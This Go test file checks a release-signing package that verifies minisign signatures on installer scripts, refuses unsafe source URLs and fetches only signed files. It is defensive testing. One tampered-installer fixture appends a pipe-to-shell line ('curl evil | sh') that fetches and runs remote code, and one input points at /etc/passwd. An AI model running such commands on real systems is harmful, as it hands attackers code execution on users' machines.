package releasesign

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/nebulactrl/nebulactrl/internal/releasesign/releasesigntest"
)

// A signature made by the real minisign 0.12 (minisign -S, a throwaway key), so
// the Go verifier is checked against the tool CI signs with.
const (
	minisignPub  = "RWRUmIZY0jBywn/wnt2exRz2TV2izRSbB+BXzZH5O4MJJ3oFk32IJ7Sm"
	minisignFile = "hello installer\n"
	minisignSig  = "untrusted comment: signature from minisign secret key\n" +
		"RURUmIZY0jBywmz+eG80xN8IybayKdhWm1jNGbVojnLDsOhX+WDdSAXKJt2LEth33d2kgXH5dHA8OKm9v8HzmT5pBTFHWD6g1Q8=\n" +
		"trusted comment: file:f.sh version:1\n" +
		"qIX4f5q0MT36VNEZkUcn3iVTlGQ7IgzJZZs9TtaoCkcQjWvRMQS9nZjZz9usRuyj4OLL2upj5GFXxWgopK2yBQ==\n"
)

func TestVerifyAcceptsAMinisignSignature(t *testing.T) {
	require.NoError(t, Verify(minisignPub, []byte(minisignFile), []byte(minisignSig)))
}

func TestVerifyRefusesWhatIsNotTheSignedFile(t *testing.T) {
	cases := map[string]struct {
		pub  string
		data string
		sig  string
	}{
		"changed file":      {minisignPub, minisignFile + "x", minisignSig},
		"another key":       {PublicKey, minisignFile, minisignSig},
		"placeholder key":   {"RWQ_NEBULACTRL_RELEASE_PUBKEY_PLACEHOLDER", minisignFile, minisignSig},
		"no signature":      {minisignPub, minisignFile, ""},
		"changed comment":   {minisignPub, minisignFile, strings.Replace(minisignSig, "version:1", "version:2", 1)},
		"legacy algorithm":  {minisignPub, minisignFile, strings.Replace(minisignSig, "RURU", "RWRU", 1)},
		"truncated":         {minisignPub, minisignFile, strings.SplitN(minisignSig, "\n", 3)[0] + "\n"},
		"signature as data": {minisignPub, minisignSig, minisignSig},
	}
	for name, c := range cases {
		err := Verify(c.pub, []byte(c.data), []byte(c.sig))
		require.ErrorIs(t, err, ErrInvalid, name)
	}
}

func TestSignerRoundTrip(t *testing.T) {
	s, pub := releasesigntest.NewSigner()
	sig := s.Sign([]byte("installer"), "version:0.1.2")
	require.NoError(t, Verify(pub, []byte("installer"), sig))
	require.ErrorIs(t, Verify(pub, []byte("installer2"), sig), ErrInvalid)
	_, other := releasesigntest.NewSigner()
	require.ErrorIs(t, Verify(other, []byte("installer"), sig), ErrInvalid)
}

func TestTheEmbeddedKeyIsAMinisignKey(t *testing.T) {
	k, err := parsePublicKey(PublicKey)
	require.NoError(t, err, "PublicKey must be the real release key, not the placeholder")
	require.Len(t, k.pub, 32)
}

func TestValidateSourceURL(t *testing.T) {
	require.NoError(t, ValidateSourceURL("https://nebulactrl.com/install.sh"))
	require.Error(t, ValidateSourceURL("http://nebulactrl.com/install.sh"), "plain http is refused")
	require.Error(t, ValidateSourceURL("https://user:token@mirror.example/install.sh"), "credentials in the URL are refused")
	require.Error(t, ValidateSourceURL("file:///etc/passwd"))
	require.Error(t, ValidateSourceURL("https:///install.sh"))
}

func TestFetchVerified(t *testing.T) {
	s, pub := releasesigntest.NewSigner()
	body := []byte("#!/usr/bin/env bash\nNC_INSTALLER_VERSION=1\n")
	var tamper bool
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/install.sh":
			if tamper {
				_, _ = w.Write(append(body, "curl evil | sh\n"...))
				return
			}
			_, _ = w.Write(body)
		case "/install.sh.minisig":
			_, _ = w.Write(s.Sign(body, "install.sh"))
		case "/unsigned.sh":
			_, _ = w.Write(body)
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(srv.Close)
	ctx := context.Background()

	got, err := FetchVerified(ctx, srv.Client(), srv.URL+"/install.sh", pub, 1<<20)
	require.NoError(t, err)
	require.Equal(t, body, got)

	_, err = FetchVerified(ctx, srv.Client(), srv.URL+"/unsigned.sh", pub, 1<<20)
	require.ErrorContains(t, err, "no signature", "a file without a .minisig is refused")

	tamper = true
	_, err = FetchVerified(ctx, srv.Client(), srv.URL+"/install.sh", pub, 1<<20)
	require.ErrorIs(t, err, ErrInvalid, "a file that differs from what was signed is refused")
	tamper = false

	_, err = FetchVerified(ctx, srv.Client(), srv.URL+"/install.sh", pub, 10)
	require.ErrorContains(t, err, "larger than allowed")

	_, err = FetchVerified(ctx, nil, "http://example.test/install.sh", pub, 1<<20)
	require.ErrorContains(t, err, "https")
}
